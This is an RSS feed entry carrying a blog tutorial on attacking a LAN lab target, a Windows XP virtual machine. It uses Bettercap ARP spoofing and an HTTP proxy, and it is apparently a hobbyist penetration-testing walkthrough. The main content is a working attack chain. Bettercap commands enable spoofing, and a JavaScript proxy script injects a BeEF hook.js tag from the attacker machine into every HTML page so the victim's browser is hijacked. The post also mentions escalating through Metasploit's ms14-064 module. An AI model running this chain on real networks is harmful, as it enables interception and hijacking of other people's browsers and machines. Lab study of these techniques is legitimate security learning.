<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>beef - Tag - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/beef/</link>
        <description>beef - Tag - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/beef/" rel="self" type="application/rss+xml" /><item>
    <title>LAN Penetration Testing with Beef, Bettercap, and Other Tools</title>
    <link>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
    <pubDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2021-02-02_13-51.png" referrerpolicy="no-referrer">
            </div><h2 id="introduction">Introduction</h2>
<p>Well&hellip; Let&rsquo;s start with some rambling as usual&hellip;</p>
<p>Today, I tried using Beef and Bettercap together and found them to be quite effective~</p>
<p>Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~</p>
<p>Without further ado, let&rsquo;s get started~</p>
<h3 id="testing-environment">Testing Environment</h3>
<p>First, let&rsquo;s talk about the testing environment.</p>
<ul>
<li>
<p>Attacker machine</p>
<ul>
<li>Arch Linux</li>
<li>192.168.101.15</li>
</ul>
</li>
<li>
<p>Target machine</p>
<ul>
<li>Windows XP on VirtualBox</li>
<li>192.168.101.43</li>
</ul>
</li>
</ul>
<p>Due to limited resources, we can only use Windows XP for this demonstration~</p>
<h3 id="tools-used">Tools Used</h3>
<ol>
<li>Bettercap
<ul>
<li>First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks&hellip;</li>
</ul>
</li>
<li>Beef
<ul>
<li>Used for browser hijacking&hellip; and it can do many things, but I don&rsquo;t know the specifics.</li>
</ul>
</li>
<li>Metasploit (msf)
<ul>
<li>Our old friend~</li>
</ul>
</li>
</ol>
<h2 id="testing-process">Testing Process</h2>
<p>First, let&rsquo;s open <code>bettercap</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we will see the following output..</p>
<p></p>
<p><strong>Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don&rsquo;t use sudo, you will see a prompt like this.</strong></p>
<p></p>
<p>Next, set the target for ARP spoofing:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Here, the targets are set to the IP address of the target machine.</strong></p>
<p>Next, start Beef, and remember to use <code>sudo</code> as mentioned earlier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
</span></span></code></pre></td></tr></table>
</div>
</div><p>The output should be like this:</p>
<p></p>
<p>Now, let&rsquo;s talk about the links displayed in the terminal:</p>
<ul>
<li>Hook URL:  <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/hook.js</a>
<ul>
<li>This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~
Later, we will write it into an attack script~</li>
</ul>
</li>
<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer">http://192.168.101.15:3000/ui/panel</a>
<ul>
<li>This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this.</li>
</ul>
</li>
</ul>
<p></p>
<p>About the username and password, here&rsquo;s the thing: In some systems, you can&rsquo;t use the default login credentials <code>(beef:beef)</code> for Beef, and it may not even start. For example, this is the case with my Arch Linux.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
</span></span></code></pre></td></tr></table>
</div>
</div><p>In such cases, what you need to do is modify the <code>config.yaml</code> file. In my case, the file is located at <code>/usr/share/beef/config.yaml</code>.</p>
<p>Modify it as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;Choose a username&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Think of a password&#34;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>After that, you can start the system, and the username and password you set will be used for login.</p>
<p>Alright, without further ado, let&rsquo;s continue.</p>
<p>Next, we need to write a JavaScript script to use with Bettercap.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Save this file to a directory of your choice. I will save it to <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code>.</p>
<p>Then, let&rsquo;s go back to Bettercap and set the <code>http.proxy.script</code> parameter to the path mentioned above:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then start <code>net.probe</code>, <code>arp.spoof</code>, and <code>http.proxy</code> in sequence.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alright&hellip; Now everything is set up and ready to go&hellip;</p>
<p></p>
<p>Then we&rsquo;ll have the target machine open a browser and visit a website&hellip;</p>
<p>Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.</p>
<p></p>
<p></p>
]]></description>
</item></channel>
</rss>
